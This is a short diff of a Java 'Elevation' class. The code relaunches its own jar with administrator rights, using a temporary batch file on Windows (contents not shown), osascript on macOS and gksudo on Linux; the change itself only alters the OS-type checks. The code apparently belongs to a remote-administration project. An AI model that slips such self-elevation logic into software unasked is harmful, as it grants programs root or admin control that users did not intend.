@@ -11,7 +11,7 @@ import com.redpois0n.oslib.OperatingSystem;
 public class Elevation {
 
 	public static void executeElevation() throws Exception {
-		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 			File file = File.createTempFile("elev", ".bat");
 			PrintWriter writer = new PrintWriter(new FileOutputStream(file));
 			
@@ -37,10 +37,10 @@ public class Elevation {
 			writer.close();
 		
 			Runtime.getRuntime().exec("\"" + file.getAbsolutePath() + "\"");	 	
-		} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
+		} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
 			String[] command = { "osascript", "-e", "do shell script \"java -jar " + Utils.getJarFile().getAbsolutePath() + "\" with administrator privileges" };
 			Runtime.getRuntime().exec(command);
-		} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.LINUX) {
+		} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.LINUX) {
 			String[] command = { "gksudo", "java -jar '" + Utils.getJarFile().getAbsolutePath()  + "'" };
 			Runtime.getRuntime().exec(command);
 		} else {
